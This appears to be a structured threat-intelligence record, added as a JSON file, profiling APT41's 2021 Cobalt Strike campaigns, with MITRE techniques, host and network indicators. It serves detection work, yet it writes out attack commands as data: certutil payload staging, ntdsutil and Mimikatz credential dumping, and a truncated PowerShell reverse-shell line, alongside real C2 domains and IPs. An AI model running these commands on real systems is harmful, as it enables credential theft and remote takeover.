@@ -1,0 +1,543 @@
+{
+  "malware_family": "Cobalt Strike",
+  "threat_actor": "APT41",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "In 2021, APT41 conducted campaigns using SQL injection for initial access to deploy custom Cobalt Strike beacons. The threat actor used a unique multi-stage payload delivery method involving chunked Base64 data written via `echo` and decoded with `certutil`. They also used a custom injector named StealthMutant to bypass ETW and AV.",
+  "mitre_techniques": [
+    "T1595",
+    "T1596.005",
+    "T1190",
+    "T1059.003",
+    "T1059.001",
+    "T1053.005",
+    "T1569.002",
+    "T1047",
+    "T1053.002",
+    "T1543.003",
+    "T1547.001",
+    "T1027.002",
+    "T1070.004",
+    "T1222",
+    "T1562.006",
+    "T1003.003",
+    "T1003.002",
+    "T1003.001",
+    "T1555.003",
+    "T1552.001",
+    "T1087",
+    "T1082",
+    "T1069",
+    "T1012",
+    "T1482",
+    "T1124",
+    "T1057",
+    "T1046",
+    "T1135",
+    "T1016",
+    "T1049",
+    "T1018",
+    "T1550.002",
+    "T1570",
+    "T1560.001",
+    "T1602",
+    "T1005",
+    "T1071.001",
+    "T1071.004",
+    "T1105",
+    "T1090.001",
+    "T1041"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "Echo [Base64]{775} >> C:\\dns.txt",
+      "context": "Writing base64 encoded payload to a file in 775-character chunks.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "certutil -decode C:\\dns.txt C:\\dns.exe",
+      "context": "Decoding the staged payload from base64 to an executable.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "certutil -hashfile C:\\dns.exe",
+      "context": "Verifying the integrity of the decoded payload file.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "move C:\\dns.exe C:\\windows\\mciwave.exe",
+      "context": "Renaming and moving the payload to a masquerade path.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!@#Virg0#@!",
+      "context": "Hardcoded password used in a SCHTASKS command for lateral movement.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "P$ssw0rd0006",
+      "context": "Hardcoded password used in a wmic command for remote process creation.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Passw0rd@123",
+      "context": "Hardcoded password used in a wmic command for remote process creation.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "payload",
+      "context": "Mistakenly used literal string in a copied setspn command.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "yuming",
+      "context": "Directory name, which means 'domain name' in Chinese (Pinyin).",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "远控",
+      "context": "Chinese characters meaning 'remote control' found in an upload file path.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "8c93083440cd9ce5fe4cf58c3348bd85bdf07f6c",
+      "context": "SHA1 of a unique Cobalt Strike team server SSL certificate containing 'fortawesome'.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0cc907db409a259611f56abc7dead19c6ed51fd0",
+      "context": "SHA1 of a custom Cobalt Strike listener SSL certificate mimicking 'Microsoft'.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "afef10f23f1403761173557178c21308461778ba",
+      "context": "SHA1 of a custom Cobalt Strike listener SSL certificate mimicking 'Facebook'.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "4690a60aa5e6e323ad04993bf0076e9c78e7413c",
+      "context": "SHA1 of a custom Cobalt Strike listener SSL certificate mimicking 'CloudFlare'.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "Exec2022",
+      "context": "Scheduled task name used to run taskhosts.exe.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "SuperIe",
+      "context": "Service name created to execute install.bat.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "res",
+      "context": "Service name created to execute vmserver.exe.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "LxpSrvc",
+      "context": "Service name used for persistence.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "named_pipe",
+      "value": "\\\\.\\pipe\\277bf3",
+      "context": "Named pipe used in a Mimikatz pass-the-hash command.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Mimikatz",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "named_pipe",
+      "value": "\\\\.\\pipe\\bce0a1",
+      "context": "Named pipe used in a Mimikatz pass-the-hash command.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Mimikatz",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\perflogs\\temp\" q q",
+      "context": "Dumping Active Directory database using ntdsutil.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\mi.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords full\"\" exit >> C:\\log.tx",
+      "context": "Dumping credentials using a renamed Mimikatz executable.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Mimikatz",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{redacted}', 80);...\"",
+      "context": "PowerShell reverse shell one-liner for C2 communication.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "frcp.exe -c frcp.ini",
+      "context": "Running FRPC proxy tool.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "frp",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "mciwave.exe",
+      "context": "Masquerade name for payload in C:\\windows\\.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "vmserver.exe",
+      "context": "Payload placed in C:\\PerfLogs\\ and run as a service.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "COMSysUpdate.exe",
+      "context": "Payload placed in C:\\users\\Public\\ and executed via wmic.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "BadPotatoNet4.exe",
+      "context": "Publicly available privilege escalation tool.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "BadPotato",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "BrowserGhost.exe",
+      "context": "Tool to obtain credentials from browsers.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "BrowserGhost",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "531c720aae6e053b9db9be8e7b56f78f",
+      "context": "MD5 hash of Cobalt Strike public key.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "9cdb3fca6156c6cbed2f01d6431b3dfb",
+      "context": "MD5 hash of Cobalt Strike public key.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MANM; MANM)",
+      "context": "User-Agent from a Cobalt Strike Beacon configuration.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Cobalt Strike",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0",
+      "context": "User-Agent from a Cobalt Strike Beacon configuration.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Cobalt Strike",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "delaylink.tk",
+      "context": "C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "javaupdate.biguserup.workers.dev",
+      "context": "C2 domain used with Cloudflare Workers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "colunm.tk",
+      "context": "C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "mute-pond-371d.zalocdn.workers.dev",
+      "context": "C2 domain used with Cloudflare Workers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cs16.dns04.com",
+      "context": "C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gentle-voice-65e3.bsnl.workers.dev",
+      "context": "C2 domain used with Cloudflare Workers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "newimages.socialpt2021.tk",
+      "context": "C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "updata.microsoft-api.workers.dev",
+      "context": "C2 domain used with Cloudflare Workers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "socialpt2021.club",
+      "context": "C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.142.214.242",
+      "context": "C2 IP address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.144.31.31",
+      "context": "C2 IP address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.142.212.47",
+      "context": "C2 IP address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/jquery-3.3.1.min.js",
+      "context": "Cobalt Strike HTTP GET URI path.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/jquery-3.2.2.min.js",
+      "context": "Cobalt Strike HTTP POST URI path.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/__utm.gif",
+      "context": "Cobalt Strike HTTP GET URI path.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/submit.php",
+      "context": "Cobalt Strike HTTP POST URI path.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "http_header",
+      "value": "Accept: */*2Referer: https://javaupdate.biguserup.workers.dev/Accept-Encoding: *&Host: javaupdate.biguserup.workers.dev__cfduid",
+      "context": "Anomalous Cobalt Strike HTTP POST client header string.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "Accept-Encoding: *&Host: javaupdate.biguserup.workers.devAccept: */*2Referer: https://javaupdate.biguserup.workers.dev/__cfduid=Cookie",
+      "context": "Anomalous Cobalt Strike HTTP GET client header string.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "&Content-Type: application/octet-streamid",
+      "context": "Anomalous Cobalt Strike HTTP POST client header string with leading '&'.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
